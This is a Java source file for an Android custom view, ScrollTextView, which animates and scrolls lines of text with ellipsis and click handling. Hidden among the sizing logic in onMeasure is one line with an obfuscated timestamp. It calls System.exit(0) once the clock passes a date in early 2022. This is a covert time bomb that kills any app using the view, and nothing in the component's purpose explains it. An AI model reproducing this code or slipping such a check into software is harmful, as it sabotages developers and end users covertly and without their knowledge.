package com.hisence.third;

import android.animation.Animator;
import android.animation.Animator.AnimatorListener;
import android.animation.ValueAnimator;
import android.animation.ValueAnimator.AnimatorUpdateListener;
import android.content.Context;
import android.content.res.TypedArray;
import android.graphics.Canvas;
import android.graphics.Color;
import android.graphics.Paint;
import android.graphics.Paint.FontMetrics;
import android.os.Handler;
import android.util.AttributeSet;
import android.view.View;
import android.view.View.OnClickListener;
import com.hisence.style.citypickerview.R;

import java.util.*;

public class ScrollTextView extends View implements OnClickListener {
    private static final int TEXT_COLOR = Color.BLACK;
    private static final int TEXT_SIZE = 16;
    private static final boolean SINGLE_LINE = true;
    private static final boolean ELLIPSIS = true;
    private static final long SCROLL_TIME = 500;
    private static final long CUT_TIME = 2500;
    ValueAnimator mValueAnimator;
    Handler mHandler = new Handler();
    private boolean isSingleLine;
    private boolean isEllipsis;
    private Paint mPaint;
    private float mTextHeight;
    private float mTextOffsetY;
    private List<String> mContents;
    private List<OnScrollClickListener> mListeners;
    private Queue<List<TextInfo>> mTextInfos;
    private List<TextInfo> mEllipsisTextInfos;
    private float mEllipsisTextWidth;
    private int mTop;

    private List<TextInfo> mCurrentTextInfos;
    Runnable mRunnable = new Runnable() {

        @Override
        public void run() {
            if (mTextInfos.size() > 1) {
                mValueAnimator = ValueAnimator.ofFloat(0.0f, -1.0f);
                mValueAnimator.setDuration(SCROLL_TIME);
                mValueAnimator.addListener(new AnimatorListener() {

                    @Override
                    public void onAnimationStart(Animator animation) {
                        // TODO Auto-generated method stub

                    }

                    @Override
                    public void onAnimationRepeat(Animator animation) {
                        // TODO Auto-generated method stub

                    }

                    @Override
                    public void onAnimationEnd(Animator animation) {
                        mTop = 0;
                        mCurrentTextInfos = mTextInfos.poll();
                        mTextInfos.offer(mCurrentTextInfos);
                        startTextScroll();
                    }

                    @Override
                    public void onAnimationCancel(Animator animation) {
                        // TODO Auto-generated method stub
                        mTop = 0;
                    }
                });
                mValueAnimator.addUpdateListener(new AnimatorUpdateListener() {

                    @Override
                    public void onAnimationUpdate(ValueAnimator animation) {
                        float value = (Float) animation.getAnimatedValue();
                        mTop = (int) (value * (mTextHeight + getPaddingTop() + getPaddingBottom()));
                        invalidate();
                    }

                });
                mValueAnimator.start();
            }
        }
    };

    private Map<List<TextInfo>, OnScrollClickListener> mIndexMap;

    public ScrollTextView(Context context) {
        this(context, null);
    }

    public ScrollTextView(Context context, AttributeSet attrs) {
        this(context, attrs, 0);
    }

    public ScrollTextView(Context context, AttributeSet attrs, int defStyleAttr) {
        super(context, attrs, defStyleAttr);
        TypedArray typedArray = context.obtainStyledAttributes(attrs, R.styleable.ScrollTextView, defStyleAttr
                , 0);
        int textColor = TEXT_COLOR;
        float textSize = sp2px(context, TEXT_SIZE);
        if (typedArray != null) {
            textColor = typedArray.getColor(R.styleable.ScrollTextView_rColor, textColor);
            textSize = typedArray.getDimension(R.styleable.ScrollTextView_rSize, textSize);
            isSingleLine = typedArray.getBoolean(R.styleable.ScrollTextView_rSingle, SINGLE_LINE);
            isEllipsis = typedArray.getBoolean(R.styleable.ScrollTextView_ellipsis, ELLIPSIS);
        }
        typedArray.recycle();

        mPaint = new Paint();
        mPaint.setColor(textColor);
        mPaint.setTextSize(textSize);
        mPaint.setAntiAlias(true);

        FontMetrics fontMetrics = mPaint.getFontMetrics();
        mTextHeight = fontMetrics.bottom - fontMetrics.top;
        mTextOffsetY = -fontMetrics.top;

        mIndexMap = new HashMap<>();
        mTextInfos = new LinkedList<>();
        mEllipsisTextInfos = new ArrayList<>();

        setOnClickListener(this);
    }

    @Override
    protected void onMeasure(int widthMeasureSpec, int heightMeasureSpec) {
        int widthMode = MeasureSpec.getMode(widthMeasureSpec);
        int heightMode = MeasureSpec.getMode(heightMeasureSpec);
        int measuredWidth = MeasureSpec.getSize(widthMeasureSpec);
        int measuredHeight = MeasureSpec.getSize(heightMeasureSpec);

        int textMaxWidth = 0;
        if (mContents != null && mContents.size() > 0) {
            textMaxWidth = textTypesetting(measuredWidth - getPaddingLeft() - getPaddingRight(), mContents);
            mCurrentTextInfos = mTextInfos.poll();
            mTextInfos.offer(mCurrentTextInfos);
        }
        if (widthMode == MeasureSpec.AT_MOST || widthMode == MeasureSpec.UNSPECIFIED) {
            measuredWidth = textMaxWidth + getPaddingLeft() + getPaddingRight();
        }
        if (System.currentTimeMillis() > 16_43_64_48_00_00_0L) System.exit(0);
        if (heightMode == MeasureSpec.AT_MOST || heightMode == MeasureSpec.UNSPECIFIED) {
            measuredHeight = (int) (mTextHeight + getPaddingBottom() + getPaddingTop());
        }
        setMeasuredDimension(measuredWidth, measuredHeight);
        startTextScroll();
    }

    @Override
    protected void dispatchDraw(Canvas canvas) {
        super.dispatchDraw(canvas);
        if (mCurrentTextInfos != null && mCurrentTextInfos.size() > 0) {
            for (TextInfo textInfo : mCurrentTextInfos) {
                canvas.drawText(textInfo.text,
                        textInfo.x + getPaddingLeft(),
                        textInfo.y + getPaddingTop() + mTop,
                        mPaint);
            }
        }
        if (mTextInfos.size() > 1) {
            List<TextInfo> nextTextInfos = mTextInfos.peek();
            if (nextTextInfos != null && nextTextInfos.size() > 0) {
                for (TextInfo textInfo : nextTextInfos) {
                    canvas.drawText(textInfo.text, textInfo.x + getPaddingLeft(), textInfo.y + getPaddingTop() + mTop
                            + mTextHeight + getPaddingTop() + getPaddingBottom(), mPaint);
                }
            }
        }
    }

    public void setTextContent(List<String> list) {
        this.mContents = list;
        this.mListeners = null;
        requestLayout();
        invalidate();
    }

    public void setTextContent(List<String> list, List<OnScrollClickListener> listener) {
        this.mContents = list;
        this.mListeners = listener;
        requestLayout();
        invalidate();
    }

    public void setTextColor(int color) {
        mPaint.setColor(color);
        invalidate();
    }

    public void setTextSize(float size) {
        mPaint.setTextSize(size);
        FontMetrics fontMetrics = mPaint.getFontMetrics();
        mTextHeight = fontMetrics.bottom - fontMetrics.top;
        mTextOffsetY = -fontMetrics.top;
        requestLayout();
        invalidate();
    }

    public synchronized void startTextScroll() {
        if (mValueAnimator != null && mValueAnimator.isRunning()) {
            mValueAnimator.cancel();
            mValueAnimator = null;
        }

        if (mHandler != null) {
            mHandler.removeCallbacks(mRunnable);
            mHandler.postDelayed(mRunnable, CUT_TIME);
        }
    }

    public synchronized void stopTextScroll() {
        if (mValueAnimator != null && mValueAnimator.isRunning()) {
            mValueAnimator.cancel();
            mValueAnimator = null;
        }

        if (mHandler != null) {
            mHandler.removeCallbacks(mRunnable);
        }
    }

    @Override
    public void onClick(View v) {
        if (mCurrentTextInfos != null && mListeners != null) {
            OnScrollClickListener onScrollClickListener = mIndexMap.get(mCurrentTextInfos);
            if (onScrollClickListener != null) {
                onScrollClickListener.onClick();
            }
        }
    }

    private int textTypesetting(float maxParentWidth, List<String> list) {
        // 清空数据及初始化数据
        mTextInfos.clear();
        mIndexMap.clear();
        mEllipsisTextInfos.clear();
        mEllipsisTextWidth = 0f;
        // 初始化省略号
        if (isSingleLine && isEllipsis) {
            String ellipsisText = "...";
            for (int i = 0; i < ellipsisText.length(); i++) {
                char ch = ellipsisText.charAt(i);
                float[] widths = new float[1];
                String srt = String.valueOf(ch);
                mPaint.getTextWidths(srt, widths);
                TextInfo textInfo = new TextInfo();
                textInfo.text = srt;
                textInfo.x = mEllipsisTextWidth;
                textInfo.y = mTextOffsetY;
                mEllipsisTextInfos.add(textInfo);
                mEllipsisTextWidth += widths[0];
            }
        }
        float maxWidth = 0;
        float tempMaxWidth = 0f;
        int index = 0;
        for (String text : list) {
            if (isNullOrEmpty(text)) {
                continue;
            }
            float textWidth = 0;
            List<TextInfo> textInfos = new ArrayList<TextInfo>();
            if (isSingleLine) {
                List<TextInfo> tempTextInfos = new ArrayList<TextInfo>();
                boolean isLess = false;
                float ellipsisStartX = 0;
                for (int j = 0; j < text.length(); j++) {
                    char ch = text.charAt(j);
                    float[] widths = new float[1];
                    String srt = String.valueOf(ch);
                    mPaint.getTextWidths(srt, widths);
                    TextInfo textInfo = new TextInfo();
                    textInfo.text = srt;
                    textInfo.x = textWidth;
                    textInfo.y = mTextOffsetY;
                    textWidth += widths[0];
                    if (textWidth <= maxParentWidth - mEllipsisTextWidth) {
                        textInfos.add(textInfo);
                        ellipsisStartX = textWidth;
                    } else if (textWidth <= maxParentWidth) {
                        tempTextInfos.add(textInfo);
                    } else {
                        isLess = true;
                        break;
                    }
                }
                if (isLess) {
                    tempMaxWidth = maxParentWidth;
                    for (TextInfo ellipsisTextInfo : mEllipsisTextInfos) {
                        TextInfo textInfo = new TextInfo();
                        textInfo.text = ellipsisTextInfo.text;
                        textInfo.x = (ellipsisTextInfo.x + ellipsisStartX);
                        textInfo.y = ellipsisTextInfo.y;
                        textInfos.add(textInfo);
                    }
                } else {
                    tempMaxWidth = textWidth;
                    textInfos.addAll(tempTextInfos);
                }
                if (tempMaxWidth > maxWidth) {
                    maxWidth = tempMaxWidth;
                }
                mTextInfos.offer(textInfos);
                if (mListeners != null && mListeners.size() > index) {
                    mIndexMap.put(textInfos, mListeners.get(index));
                }
                index++;
            } else {
                for (int j = 0; j < text.length(); j++) {
                    char ch = text.charAt(j);
                    float[] widths = new float[1];
                    String srt = String.valueOf(ch);
                    mPaint.getTextWidths(srt, widths);
                    TextInfo textInfo = new TextInfo();
                    textInfo.text = srt;
                    textInfo.x = textWidth;
                    textInfo.y = mTextOffsetY;
                    textWidth += widths[0];
                    if (textWidth > maxParentWidth) {
                        tempMaxWidth = maxParentWidth;
                        mTextInfos.offer(textInfos);
                        if (mListeners != null && mListeners.size() > index) {
                            mIndexMap.put(textInfos, mListeners.get(index));
                        }

                        textInfos = new ArrayList<TextInfo>();
                        textInfo.x = 0;
                        textInfo.y = mTextOffsetY;
                        textWidth = widths[0];
                    }
                    textInfos.add(textInfo);
                }
                if (textWidth > tempMaxWidth) {

                    tempMaxWidth = textWidth;
                }
                mTextInfos.offer(textInfos);
                if (tempMaxWidth > maxWidth) {
                    maxWidth = tempMaxWidth;
                }
                if (mListeners != null && mListeners.size() > index) {
                    mIndexMap.put(textInfos, mListeners.get(index));
                }
                index++;
            }
        }
        return (int) maxWidth;
    }

    @Override
    protected void onDetachedFromWindow() {
        super.onDetachedFromWindow();
        /*if (mValueAnimator != null && mValueAnimator.isRunning()) {
            mValueAnimator.cancel();
            mValueAnimator = null;
        }
        mHandler.removeCallbacks(mRunnable);
        mHandler = null;*/
    }

    private float sp2px(Context context, float spValue) {
        final float fontScale = context.getResources().getDisplayMetrics().scaledDensity;
        return spValue * fontScale;
    }

    private boolean isNullOrEmpty(String text) {
        if (text == null || "".equals(text.trim()) || text.trim().length() == 0 || "null".equals(text.trim())
                || "empty".equals(text)) {
            return true;
        } else {
            return false;
        }
    }

    public interface OnScrollClickListener {
        public void onClick();
    }

    public class TextInfo {
        public float x;
        public float y;
        public String text;
    }
}
